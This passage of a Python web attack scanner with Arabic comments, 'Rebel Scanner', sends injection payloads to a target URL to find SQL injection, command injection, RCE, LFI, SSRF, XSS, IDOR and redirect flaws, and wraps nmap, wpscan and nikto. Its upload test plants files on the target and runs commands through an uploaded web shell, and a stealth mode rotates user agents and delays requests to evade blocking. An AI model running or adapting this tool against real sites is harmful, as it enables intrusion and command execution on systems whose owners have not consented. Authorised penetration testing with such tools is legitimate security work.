        if SEVERITY_FILTER:
            return [v for v in self.vulnerabilities if v['severity'] == SEVERITY_FILTER]
        return self.vulnerabilities
    
    def to_dict(self):
        return {
            "target": self.target,
            "scan_time": self.scan_time,
            "scan_duration": self.scan_duration,
            "aggressive_mode": AGGRESSIVE_MODE,
            "total_requests": self.total_requests,
            "vulnerabilities": self.filtered_vulnerabilities(),
            "subdomains": self.subdomains,
            "security_headers": self.security_headers,
            "critical_count": self.critical_count,
            "high_count": self.high_count,
            "medium_count": self.medium_count,
            "low_count": self.low_count,
            "hidden_endpoints": self.hidden_endpoints,
            "nmap_results": self.nmap_results,
            "wpscan_results": self.wpscan_results,
            "nikto_results": self.nikto_results,
            "js_analysis": self.js_analysis
        }

# كائن النتائج العالمي
scan_results = ScanResult(TARGET_URL)  # تمرير الهدف هنا
start_time = time.time()

# ===== إعدادات السجل =====
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('rebel_scanner.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)

# ===== قاعدة بيانات SQLite =====
class ScanDatabase:
    def __init__(self, db_path="scan_results.db"):
        self.conn = sqlite3.connect(db_path)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS scans (
            id INTEGER PRIMARY KEY,
            target TEXT,
            scan_time TEXT,
            duration REAL,
            requests INTEGER,
            critical INTEGER,
            high INTEGER,
            medium INTEGER,
            low INTEGER
        )
        ''')
        
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY,
            scan_id INTEGER,
            type TEXT,
            location TEXT,
            payload TEXT,
            severity TEXT,
            method TEXT,
            confidence TEXT,
            timestamp TEXT,
            FOREIGN KEY(scan_id) REFERENCES scans(id)
        )
        ''')
        self.conn.commit()
    
    def save_scan(self, scan_result):
        cursor = self.conn.cursor()
        cursor.execute('''
        INSERT INTO scans (
            target, scan_time, duration, requests, 
            critical, high, medium, low
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            scan_result.target,
            scan_result.scan_time,
            scan_result.scan_duration,
            scan_result.total_requests,
            scan_result.critical_count,
            scan_result.high_count,
            scan_result.medium_count,
            scan_result.low_count
        ))
        scan_id = cursor.lastrowid
        
        for vuln in scan_result.vulnerabilities:
            cursor.execute('''
            INSERT INTO vulnerabilities (
                scan_id, type, location, payload, 
                severity, method, confidence, timestamp
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                scan_id,
                vuln['type'],
                vuln['location'],
                vuln['payload'],
                vuln['severity'],
                vuln['method'],
                vuln['confidence'],
                vuln['timestamp']
            ))
        
        self.conn.commit()
        return scan_id

# ===== وظائف مساعدة =====
def random_delay():
    """تأخير عشوائي لتجنب الحظر"""
    if STEALTH_MODE:
        delay = random.uniform(0.5, 3.0)
        time.sleep(delay)

def rotate_user_agent():
    """تغيير وكيل المستخدم عشوائياً"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1'
    ]
    session.headers.update({'User-Agent': random.choice(user_agents)})

def send_request(url, method="GET", params=None, data=None, allow_redirects=False, headers=None):
    """إرسال طلب HTTP مع إدارة الأخطاء"""
    try:
        rotate_user_agent()
        random_delay()
        
        scan_results.total_requests += 1
        
        req_headers = session.headers.copy()
        if headers:
            req_headers.update(headers)
        
        if method == "GET":
            response = session.get(
                url, 
                params=params, 
                timeout=TIMEOUT,
                allow_redirects=allow_redirects,
                headers=req_headers
            )
        elif method == "POST":
            response = session.post(
                url, 
                data=data, 
                timeout=TIMEOUT,
                allow_redirects=allow_redirects,
                headers=req_headers
            )
        else:
            return None
            
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"خطأ في الطلب: {str(e)}")
    except Exception as e:
        logging.error(f"خطأ غير متوقع: {str(e)}")
    return None

def find_uploaded_file(html, filename):
    """تحديد موقع الملف المرفوع"""
    # البحث في الروابط
    pattern = re.compile(f'href=["\'](.*?{re.escape(filename)}.*?)["\']', re.IGNORECASE)
    matches = pattern.findall(html)
    if matches:
        return urljoin(TARGET_URL, matches[0])
    
    # البحث في الصور
    pattern = re.compile(f'src=["\'](.*?{re.escape(filename)}.*?)["\']', re.IGNORECASE)
    matches = pattern.findall(html)
    if matches:
        return urljoin(TARGET_URL, matches[0])
    
    # البحث في نصوص التنزيل
    pattern = re.compile(f'download=["\'](.*?{re.escape(filename)}.*?)["\']', re.IGNORECASE)
    matches = pattern.findall(html)
    if matches:
        return urljoin(TARGET_URL, matches[0])
    
    return None

def detect_dom_xss(url):
    """اكتشاف ثغرات DOM XSS باستخدام Selenium مع Firefox"""
    options = FirefoxOptions()
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    
    try:
        # استخدام webdriver-manager لتثبيت وتحديث GeckoDriver
        service = FirefoxService(GeckoDriverManager().install())
        driver = webdriver.Firefox(service=service, options=options)
        driver.set_page_load_timeout(30)
        
        driver.get(url)
        
        # اختبار الحمولات
        for payload in PAYLOAD_DICT["xss"]:
            try:
                driver.execute_script(f"document.body.innerHTML += '{payload}';")
                time.sleep(2)
                
                if 'alert' in driver.page_source:
                    return True
            except:
                continue
    except Exception as e:
        logging.error(f"خطأ في Selenium: {str(e)}")
    finally:
        if 'driver' in locals():
            try:
                driver.quit()
            except:
                pass
    return False

def send_notification():
    """إرسال نتائج المسح عبر البريد الإلكتروني/Discord/Telegram"""
    if not (DISCORD_WEBHOOK or TELEGRAM_BOT):
        return
    
    vuln_count = len(scan_results.vulnerabilities)
    report = f"**نتائج مسح الأمان**\n"
    report += f"الهدف: {TARGET_URL}\n"
    report += f"عدد الثغرات: {vuln_count}\n"
    report += f"المدة: {scan_results.scan_duration:.2f} ثانية\n"
    
    if vuln_count > 0:
        report += "\n**الثغرات الحرجة:**\n"
        for vuln in scan_results.vulnerabilities[:3]:
            if vuln['severity'] == 'critical':
                report += f"- {vuln['type']} ({vuln['location']})\n"
    
    # إرسال إلى Discord
    if DISCORD_WEBHOOK:
        try:
            data = {"content": report}
            requests.post(DISCORD_WEBHOOK, json=data, timeout=10)
        except Exception as e:
            logging.error(f"فشل في إرسال إشعار Discord: {str(e)}")
    
    # إرسال إلى Telegram
    if TELEGRAM_BOT:
        try:
            bot_token, chat_id = TELEGRAM_BOT.split(':')
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": report
            }
            requests.post(url, data=data, timeout=10)
        except Exception as e:
            logging.error(f"فشل في إرسال إشعار Telegram: {str(e)}")

# ===== وظائف التحسينات الجديدة =====
def test_path_traversal(param, value, method="GET"):
    """اكتشاف ثغرات تجاوز المسارات"""
    for payload in PAYLOAD_DICT["path_traversal"]:
        test_value = value.replace("FUZZ", payload)
        try:
            if method == "GET":
                response = send_request(TARGET_URL, params={param: test_value})
            else:
                response = send_request(TARGET_URL, method="POST", data={param: test_value})
                
            if response and response.status_code == 200:
                if ("root:x" in response.text or 
                    "[boot loader]" in response.text or 
                    "PATH=" in response.text or
                    "Directory" in response.text or
                    "Volume Serial" in response.text or
                    "MySQL" in response.text or
                    "Apache" in response.text):
                    severity = "high"
                    logging.critical(f"[!] Path Traversal Vulnerability Found: {param}={payload}")
                    scan_results.add_vulnerability("Path Traversal", f"{method} parameter: {param}", payload, severity, method)
                    return True
        except:
            continue
    return False

def test_cmd_injection(param, value, method="GET"):
    """اكتشاف ثغرات حقن الأوامر"""
    for payload in PAYLOAD_DICT["cmd_injection"]:
        test_value = value.replace("FUZZ", payload)
        try:
            if method == "GET":
                response = send_request(TARGET_URL, params={param: test_value})
            else:
                response = send_request(TARGET_URL, method="POST", data={param: test_value})
                
            if response and response.status_code == 200:
                if ("REBEL" in response.text or 
                    "bin" in response.text or 
                    "etc" in response.text or 
                    "Directory" in response.text or
                    "uid=" in response.text or
                    "gid=" in response.text or
                    "groups=" in response.text):
                    severity = "critical"
                    logging.critical(f"[!] Command Injection Found: {param}={payload}")
                    scan_results.add_vulnerability("Command Injection", f"{method} parameter: {param}", payload, severity, method)
                    return True
        except:
            continue
    return False

def test_cors():
    """اكتشاف إعدادات CORS غير الآمنة"""
    try:
        headers = {"Origin": "https://attacker.com"}
        response = send_request(TARGET_URL, headers=headers)
        
        if response:
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            if acao == '*' and acac.lower() == 'true':
                severity = "medium"
                logging.warning(f"[!] Insecure CORS Configuration: ACAO=*, ACAC=true")
                scan_results.add_vulnerability("CORS Misconfiguration", "HTTP Headers", "ACAO=*, ACAC=true", severity)
                return True
    except Exception as e:
        logging.error(f"Error testing CORS: {str(e)}")
    return False

async def test_websocket(url):
    """فحص ثغرات WebSocket"""
    try:
        async with websockets.connect(url) as ws:
            # اختبار XSS عبر WebSocket
            payload = "<script>alert('WS-XSS')</script>"
            await ws.send(payload)
            response = await ws.recv()
            
            if payload in response:
                severity = "medium"
                logging.warning(f"[!] WebSocket XSS Vulnerability: {url}")
                scan_results.add_vulnerability("WebSocket XSS", url, payload, severity)
                return True
    except Exception as e:
        logging.error(f"WebSocket error: {str(e)}")
    return False

def analyze_javascript(response):
    """تحليل JavaScript لاكتشاف نقاط النهاية المخفية"""
    soup = BeautifulSoup(response.text, 'html.parser')
    scripts = soup.find_all('script')
    
    endpoints = set()
    
    for script in scripts:
        if script.src:
            # تحميل ملف JavaScript خارجي
            try:
                js_content = requests.get(urljoin(TARGET_URL, script.src)).text
            except:
                continue
        else:
            js_content = script.string
        
        if not js_content:
            continue
        
        # تحسين وتنسيق كود JavaScript
        try:
            beautified = jsbeautifier.beautify(js_content)
        except:
            beautified = js_content
        
        # البحث عن أنماط URLs
        patterns = [
            r"['\"](https?://[^'\"]+)['\"]",
            r"['\"](/[^'\"]+)['\"]",
            r"url\(['\"]?([^)'\"]+)['\"]?\)",
            r"fetch\(['\"]?([^)'\"]+)['\"]?\)",
            r"axios\.get\(['\"]?([^)'\"]+)['\"]?\)",
            r"\.post\(['\"]?([^)'\"]+)['\"]?\)",
            r"\.ajax\([^)]*url:\s*['\"]([^'\"]+)['\"]",
            r"window\.location\s*=\s*['\"]([^'\"]+)['\"]",
            r"window\.open\(['\"]([^'\"]+)['\"]\)",
            r"src\s*=\s*['\"]([^'\"]+)['\"]",
            r"href\s*=\s*['\"]([^'\"]+)['\"]",
            r"apiUrl:\s*['\"]([^'\"]+)['\"]",
            r"baseUrl:\s*['\"]([^'\"]+)['\"]",
            r"endpoint:\s*['\"]([^'\"]+)['\"]"
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, beautified)
            for match in matches:
                if any(ext in match for ext in ['.png', '.jpg', '.css', '.ico']):
                    continue
                endpoints.add(urljoin(TARGET_URL, match))
    
    return list(endpoints)

def run_nmap_scan(target):
    """تشغيل فحص Nmap الأساسي"""
    try:
        target_domain = urlparse(target).netloc
        result = subprocess.run(
            ['nmap', '-T4', '-F', '-oX', 'nmap_scan.xml', target_domain],
            capture_output=True,
            text=True,
            timeout=300
        )
        
        # تحويل XML إلى HTML
        try:
            tree = ET.parse('nmap_scan.xml')
            root = tree.getroot()
            
            html_output = """
            <style>
                .nmap-results { font-family: monospace; white-space: pre; background-color: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; }
                .host { margin-bottom: 20px; padding: 10px; background-color: #3c3c3c; border-radius: 5px; }
                .host h3 { color: #66d9ef; margin-top: 0; }
                .port { padding: 5px; margin: 5px 0; background-color: #49483e; border-radius: 3px; }
                .open { color: #a6e22e; }
                .closed { color: #f92672; }
                .service { color: #ae81ff; }
            </style>
            <div class="nmap-results">
            """
            
            for host in root.findall('host'):
                address = host.find('address').get('addr')
                hostnames = [hn.get('name') for hn in host.findall('hostnames/hostname')]
                host_html = f'<div class="host"><h3>Host: {address} ({", ".join(hostnames)})</h3>'
                
                for port in host.findall('ports/port'):
                    port_id = port.get('portid')
                    state = port.find('state').get('state')
                    service = port.find('service').get('name') if port.find('service') is not None else 'unknown'
                    
                    port_html = f'''
                    <div class="port">
                        <span class="{'open' if state == 'open' else 'closed'}">Port: {port_id}/{state}</span>
                        <span class="service">Service: {service}</span>
                    </div>
                    '''
                    host_html += port_html
                
                host_html += '</div>'
                html_output += host_html
            
            html_output += "</div>"
            return html_output
        except Exception as e:
            logging.error(f"خطأ في تحويل نتائج Nmap: {str(e)}")
            return result.stdout
    except Exception as e:
        logging.error(f"Nmap scan failed: {str(e)}")
        return None

def run_wpscan(target):
    """تشغيل فحص WPScan"""
    try:
        result = subprocess.run(
            ['wpscan', '--url', target, '--no-update', '--format', 'json', '-o', 'wpscan.json'],
            capture_output=True,
            text=True,
            timeout=600
        )
        
        # تحويل JSON إلى HTML
        try:
            with open('wpscan.json', 'r') as f:
                data = json.load(f)
                
            html_output = """
            <style>
                .wpscan-results { font-family: monospace; background-color: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; }
                .vulnerability { padding: 10px; margin: 10px 0; background-color: #49483e; border-radius: 5px; }
                .critical { color: #ff5555; }
                .high { color: #ff79c6; }
                .medium { color: #f1fa8c; }
                .low { color: #50fa7b; }
            </style>
            <div class="wpscan-results">
            """
            
            if 'version' in data:
                html_output += f"<h3>WordPress Version: {data['version']['number']}</h3>"
            
            if 'plugins' in data:
                html_output += "<h3>Plugins:</h3>"
                for plugin in data['plugins'].values():
                    html_output += f"<div><strong>{plugin['name']}</strong> v{plugin['version']}</div>"
                    if 'vulnerabilities' in plugin:
                        for vuln in plugin['vulnerabilities']:
                            html_output += f'''
                            <div class="vulnerability">
                                <span class="{vuln['severity']}">[{vuln['severity'].upper()}]</span>
                                {vuln['title']} - {vuln['references']['url']}
                            </div>
                            '''
            
            html_output += "</div>"
            return html_output
        except Exception as e:
            logging.error(f"خطأ في تحويل نتائج WPScan: {str(e)}")
            return result.stdout
    except Exception as e:
        logging.error(f"WPScan failed: {str(e)}")
        return None

def run_nikto(target):
    """تشغيل فحص Nikto"""
    try:
        result = subprocess.run(
            ['nikto', '-h', target, '-Format', 'htm', '-o', 'nikto.html'],
            capture_output=True,
            text=True,
            timeout=600
        )
        
        # قراءة ملف HTML الناتج
        try:
            with open('nikto.html', 'r') as f:
                return f.read()
        except Exception as e:
            logging.error(f"خطأ في قراءة نتائج Nikto: {str(e)}")
            return result.stdout
    except Exception as e:
        logging.error(f"Nikto failed: {str(e)}")
        return None

def upload_to_gcloud(file_path, bucket_name):
    """رفع ملف إلى Google Cloud Storage"""
    try:
        client = storage.Client()
        bucket = client.bucket(bucket_name)
        blob = bucket.blob(os.path.basename(file_path))
        blob.upload_from_filename(file_path)
        return f"gs://{bucket_name}/{blob.name}"
    except Exception as e:
        logging.error(f"Google Cloud upload failed: {str(e)}")
        return None

def schedule_scan(interval):
    """جدولة عمليات المسح الدورية"""
    scheduler = BackgroundScheduler()
    
    if interval == 'daily':
        scheduler.add_job(start_scan, 'cron', hour=2, minute=30)
    elif interval == 'weekly':
        scheduler.add_job(start_scan, 'cron', day_of_week='mon', hour=3)
    elif interval == 'monthly':
        scheduler.add_job(start_scan, 'cron', day=1, hour=4)
    
    scheduler.start()
    logging.info(f"تم جدولة المسح للفترة: {interval}")

# ===== وحدات الفحص =====
def test_lfi(param, value, method="GET"):
    """اكتشاف ثغرات تضمين الملفات"""
    for payload in PAYLOAD_DICT["lfi"]:
        test_value = value.replace("FUZZ", payload)
        try:
            if method == "GET":
                response = send_request(TARGET_URL, params={param: test_value})
            else:
                response = send_request(TARGET_URL, method="POST", data={param: test_value})
                
            if response and response.status_code == 200:
                if ("root:x" in response.text or 
                    "daemon" in response.text or 
                    "PATH=" in response.text or 
                    "SystemRoot" in response.text or
                    "DocumentRoot" in response.text or
                    "ServerRoot" in response.text or
                    "DirectoryIndex" in response.text):
                    severity = "high"
                    logging.critical(f"[!] LFI Vulnerability Found: {param}={payload}")
                    scan_results.add_vulnerability("LFI", f"{method} parameter: {param}", payload, severity, method)
                    return True
        except:
            continue
    return False

def test_ssrf(param, value, method="GET"):
    """كشف ثغرات SSRF"""
    for payload in PAYLOAD_DICT["ssrf"]:
        test_value = value.replace("FUZZ", payload)
        try:
            if method == "GET":
                response = send_request(TARGET_URL, params={param: test_value})
            else:
                response = send_request(TARGET_URL, method="POST", data={param: test_value})
                
            if response and response.status_code in [200, 500]:
                if ("EC2" in response.text or 
                    "amazon" in response.text or 
                    "localhost" in response.text or 
                    "Internal Server Error" in response.text or
                    "metadata" in response.text or
                    "computeMetadata" in response.text or
                    "gopher" in response.text or
                    "file" in response.text):
                    severity = "high"
                    logging.warning(f"[!] SSRF CONFIRMED: {param}={payload}")
                    scan_results.add_vulnerability("SSRF", f"{method} parameter: {param}", payload, severity, method)
                    return True
        except:
            continue
    return False

def test_upload(upload_url):
    """اختبار واستغلال ثغرات رفع الملفات"""
    for filename, content in PAYLOAD_DICT["upload"]:
        files = {'file': (filename, content)}
        try:
            response = session.post(upload_url, files=files, timeout=TIMEOUT)
            if response and response.status_code in [200, 201]:
                if "success" in response.text.lower() or "upload" in response.text.lower():
                    shell_url = find_uploaded_file(response.text, filename)
                    if shell_url:
                        # اختبار الوصول للشل
                        test_response = send_request(shell_url + "?cmd=echo+rebel_scanner")
                        if test_response and "rebel_scanner" in test_response.text:
                            severity = "critical"
                            logging.critical(f"[!] FILE UPLOAD VULNERABILITY: {shell_url}")
                            scan_results.add_vulnerability("File Upload", upload_url, filename, severity)
                            return True
        except:
            continue
    return False

def test_xss(param, value, method="GET"):
    """اكتشاف ثغرات XSS"""
    for payload in PAYLOAD_DICT["xss"]:
        test_value = value.replace("FUZZ", payload)
        try:
            if method == "GET":
                response = send_request(TARGET_URL, params={param: test_value})
            else:
                response = send_request(TARGET_URL, method="POST", data={param: test_value})
                
            if response and response.status_code == 200:
                if payload in response.text:
                    severity = "medium"
                    logging.info(f"[!] XSS DETECTED: {param}={payload}")
                    scan_results.add_vulnerability("XSS", f"{method} parameter: {param}", payload, severity, method)
                    return True
        except:
            continue
    return False

def test_sqli(param, value, method="GET"):
    """كشف ثغرات SQL Injection"""
    base_time = time.time()
    try:
        if method == "GET":
            response = send_request(TARGET_URL, params={param: "test_value"})
        else:
            response = send_request(TARGET_URL, method="POST", data={param: "test_value"})
            
        if response:
            base_time = response.elapsed.total_seconds()
    except:
        pass
    
    for payload in PAYLOAD_DICT["sqli"]:
        test_value = value.replace("FUZZ", payload)
        try:
            start_time = time.time()
            if method == "GET":
                response = send_request(TARGET_URL, params={param: test_value})
            else:
                response = send_request(TARGET_URL, method="POST", data={param: test_value})
                
            if response:
                response_time = response.elapsed.total_seconds()
                
                # اكتشاف حقن SQL بناءً على وقت الاستجابة
                if response_time > base_time + 4:
                    severity = "high"
                    logging.info(f"[!] TIME-BASED SQLi: {param}={payload} (Δ {response_time-base_time:.2f}s)")
                    scan_results.add_vulnerability("SQL Injection", f"{method} parameter: {param}", payload, severity, method)
                    return True
                
                # اكتشاف حقن SQL بناءً على رسائل الخطأ
                error_patterns = [
                    "error in your SQL syntax",
                    "SQL syntax.*MySQL",
                    "Warning.*mysqli",
                    "Unclosed quotation mark",
                    "quoted string not properly terminated",
                    "SQLite3",
                    "PostgreSQL",
                    "ODBC",
                    "OLE DB",
                    "SQL Server",
                    "syntax error",
                    "unterminated quoted string",
                    "ORA-00933",
                    "ORA-01756",
                    "PLS-00306"
                ]
                
                for pattern in error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        severity = "high"
                        logging.info(f"[!] ERROR-BASED SQLi: {param}={payload}")
                        scan_results.add_vulnerability("SQL Injection", f"{method} parameter: {param}", payload, severity, method)
                        return True
                    
        except:
            continue
    return False

def test_rce(param, value, method="GET"):
    """اكتشاف ثغرات تنفيذ الأوامر عن بعد (RCE)"""
    for payload in PAYLOAD_DICT["rce"]:
        test_value = value.replace("FUZZ", payload)
        try:
            if method == "GET":
                response = send_request(TARGET_URL, params={param: test_value})
            else:
                response = send_request(TARGET_URL, method="POST", data={param: test_value})
                
            if response and response.status_code == 200:
                if ("uid=" in response.text or 
                    "root" in response.text or 
                    "Windows" in response.text or 
                    "rebel_scanner" in response.text or
                    "COMMAND.COM" in response.text or
                    "cmd.exe" in response.text or
                    "bin/sh" in response.text):
                    severity = "critical"
                    logging.critical(f"[!] RCE Vulnerability Found: {param}={payload}")
                    scan_results.add_vulnerability("RCE", f"{method} parameter: {param}", payload, severity, method)
                    return True
        except:
            continue
    return False

def test_idor(url):
    """اكتشاف ثغرات IDOR (الوصول غير المصرح به)"""
    for payload in PAYLOAD_DICT["idor"]:
        test_url = urljoin(TARGET_URL, payload)
        try:
            response = send_request(test_url)
            if response and response.status_code == 200:
                if ("password" in response.text or 
                    "admin" in response.text or 
                    "user" in response.text or 
                    "secret" in response.text or
                    "token" in response.text or
                    "key" in response.text or
                    "config" in response.text):
                    severity = "high"
                    logging.warning(f"[!] IDOR Vulnerability Found: {test_url}")
                    scan_results.add_vulnerability("IDOR", test_url, payload, severity)
                    return True
        except:
            continue
    return False

def test_open_redirect(param, value):
    """اكتشاف ثغرات إعادة التوجيه المفتوحة"""
    for payload in PAYLOAD_DICT["redirect"]:
        test_value = value.replace("FUZZ", payload)
        try:
            response = send_request(TARGET_URL, params={param: test_value}, allow_redirects=False)
            if response and 300 <= response.status_code < 400:
                location = response.headers.get('Location', '')
                if payload in location or "evil.com" in location or "malicious" in location:
                    severity = "medium"
                    logging.info(f"[!] Open Redirect Found: {param}={payload}")
                    scan_results.add_vulnerability("Open Redirect", f"GET parameter: {param}", payload, severity)
                    return True
        except:
            continue
    return False

def test_csp_bypass():
    """اختبار تجاوز سياسات أمان المحتوى (CSP)"""
    try:
        response = send_request(TARGET_URL)
        if response:
            csp_header = response.headers.get('Content-Security-Policy', '')
            
            if not csp_header:
                return False
                
            # اختبار تجاوز CSP
            for payload in PAYLOAD_DICT["csp"]:
                test_url = TARGET_URL + "?test=" + quote(payload)
                response = send_request(test_url)
                
                if response and payload in response.text:
                    severity = "medium"
                    logging.info(f"[!] CSP Bypass Possible")
                    scan_results.add_vulnerability("CSP Bypass", "CSP Header", csp_header, severity)
                    return True
    except:
        pass
    return False

def test_dom_xss(url):
    """اكتشاف ثغرات DOM XSS"""
    if detect_dom_xss(url):
        severity = "high"
        logging.warning(f"[!] DOM XSS Vulnerability Found: {url}")
        scan_results.add_vulnerability("DOM XSS", url, "DOM-based", severity)
        return True
    return False

def analyze_security_headers():
    """تحليل رؤوس الأمان"""
    try:
        response = send_request(TARGET_URL)
        if response:
            headers = response.headers
            
            security_headers = {}
            for header in PAYLOAD_DICT["headers"]:
                if header in headers:
                    security_headers[header] = headers[header]
                else:
                    security_headers[header] = "غير موجود"
            
            scan_results.set_headers(security_headers)
            logging.info(f"{Fore.CYAN}[*] Security Headers Analysis Completed{Style.RESET_ALL}")
            
            # إضافة نقاط الضعف إذا كانت الرؤوس مفقودة
            missing = [h for h, v in security_headers.items() if v == "غير موجود"]
            for header in missing:
                severity = "low" if header == "X-XSS-Protection" else "medium"
                scan_results.add_vulnerability("Missing Security Header", "HTTP Headers", header, severity)
            
            return True
    except Exception as e:
        logging.error(f"Error analyzing headers: {str(e)}")
    return False

def enumerate_subdomains():
    """اكتشاف المجالات الفرعية باستخدام DNS"""
    domain = urlparse(TARGET_URL).netloc
    base_domain = ".".join(domain.split('.')[-2:])
    
    # تحميل قائمة الكلمات
    try:
        with open(WORDLIST_FILE, 'r', encoding='utf-8') as f:
            wordlist = [line.strip() for line in f]
    except:
        wordlist = ["www", "mail", "ftp", "admin", "test", "dev", "api", "webmail", "blog", "secure"]
    
    # إعداد الوضع العدواني
    subdomains = wordlist[:100]  # الحد من عدد المجالات للفحص
    
    resolver = dns.resolver.Resolver()
    resolver.timeout = 3
    resolver.lifetime = 5
    
    found_subdomains = []
    
    def check_subdomain(sub):
        full_sub = f"{sub}.{base_domain}"
        try:
            answers = resolver.resolve(full_sub, 'A')
            if answers:
                url = f"http://{full_sub}"
                found_subdomains.append(url)
                logging.info(f"{Fore.GREEN}[+] Subdomain Found: {url}{Style.RESET_ALL}")
                return True
        except dns.resolver.NXDOMAIN:
            pass
        except dns.resolver.Timeout:
            logging.warning(f"DNS timeout for: {full_sub}")
        except Exception as e:
            logging.error(f"DNS error for {full_sub}: {str(e)}")
        return False
    
    # استخدام ThreadPoolExecutor
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(check_subdomain, sub) for sub in subdomains]
        
        # شريط التقدم
        for _ in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="جاري البحث عن المجالات الفرعية"):
            pass
    
    for sub in found_subdomains:
        scan_results.add_subdomain(sub)
    
    logging.info(f"{Fore.CYAN}[*] Subdomain Enumeration Completed: Found {len(found_subdomains)} subdomains{Style.RESET_ALL}")
    return True

# ===== خريطة دوال الفحص =====
SCAN_FUNCTIONS = {
    'lfi': test_lfi,
    'ssrf': test_ssrf,
    'upload': test_upload,
    'xss': test_xss,
    'sqli': test_sqli,
    'rce': test_rce,
    'idor': test_idor,
    'redirect': test_open_redirect,
    'csp': test_csp_bypass,
    'domxss': test_dom_xss,
    'headers': analyze_security_headers,
    'subdomain': enumerate_subdomains,
    'path_traversal': test_path_traversal,
    'cmd_injection': test_cmd_injection,
    'cors': test_cors,
}

# ===== واجهة ويب متقدمة =====
app = Flask(__name__)

@app.route('/')
def dashboard():
    # تحضير البيانات للقالب
    data = scan_results.to_dict()
    data['critical_count'] = scan_results.critical_count
    data['high_count'] = scan_results.high_count
    data['medium_count'] = scan_results.medium_count
    data['low_count'] = scan_results.low_count
    
    return render_template_string('''
    <!DOCTYPE html>
    <html dir="rtl" lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Rebel Scanner - نتائج المسح</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
        <style>
            :root {
                --critical: #dc3545;
                --high: #fd7e14;
                --medium: #ffc107;
                --low: #198754;
            }
            
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background-color: #f8f9fa;
                padding-bottom: 50px;
            }
            
            .vuln-card {
                margin-bottom: 15px;
                border-radius: 8px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                transition: transform 0.2s;
            }
            
            .vuln-card:hover {
                transform: translateY(-3px);
                box-shadow: 0 4px 8px rgba(0,0,0,0.15);
            }
            
            .critical { border-left: 5px solid var(--critical); }
            .high { border-left: 5px solid var(--high); }
            .medium { border-left: 5px solid var(--medium); }
            .low { border-left: 5px solid var(--low); }
            
            .nav-tabs { margin-bottom: 20px; }
            .filter-buttons { margin-bottom: 15px; }
            
            .stats-card {
                border-radius: 8px;
                box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                padding: 15px;
                margin-bottom: 20px;
                text-align: center;
            }
            
            .critical-bg { background-color: rgba(220, 53, 69, 0.1); }
            .high-bg { background-color: rgba(253, 126, 20, 0.1); }
            .medium-bg { background-color: rgba(255, 193, 7, 0.1); }
            .low-bg { background-color: rgba(25, 135, 84, 0.1); }
            
            .critical-count { color: var(--critical); font-weight: bold; font-size: 1.5rem; }
            .high-count { color: var(--high); font-weight: bold; font-size: 1.5rem; }
            .medium-count { color: var(--medium); font-weight: bold; font-size: 1.5rem; }
            .low-count { color: var(--low); font-weight: bold; font-size: 1.5rem; }
            
            .summary-table th {
                background-color: #e9ecef;
            }
            
            .header-missing {
                background-color: #ffeaea !important;
            }
            
            .header-present {
                background-color: #eaffea !important;
            }
            
            .badge-critical { background-color: var(--critical); }
            .badge-high { background-color: var(--high); }
            .badge-medium { background-color: var(--medium); }
            .badge-low { background-color: var(--low); }
            
            .code-block {
                font-family: 'Courier New', monospace;
                background-color: #f1f1f1;
                padding: 5px 10px;
                border-radius: 4px;
                word-break: break-all;
            }
            
            .nmap-results, .wpscan-results, .nikto-results {
                font-family: monospace;
                white-space: pre;
                background-color: #2d2d2d;
                color: #f8f8f2;
                padding: 15px;
                border-radius: 5px;
                overflow-x: auto;
            }
        </style>
    </head>
    <body>
        <div class="container mt-4">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <h1 class="mb-0">نتائج مسح الأمان</h1>
                <div>
                    <a href="/" class="btn btn-primary">
                        <i class="bi bi-arrow-repeat"></i> تحديث
                    </a>
                </div>
            </div>
            
            <div class="card mb-4">
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-3">
                            <div class="stats-card critical-bg">
                                <div class="critical-count">{{ critical_count }}</div>
                                <div>ثغرات حرجة</div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="stats-card high-bg">
                                <div class="high-count">{{ high_count }}</div>
                                <div>ثغرات عالية الخطورة</div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="stats-card medium-bg">
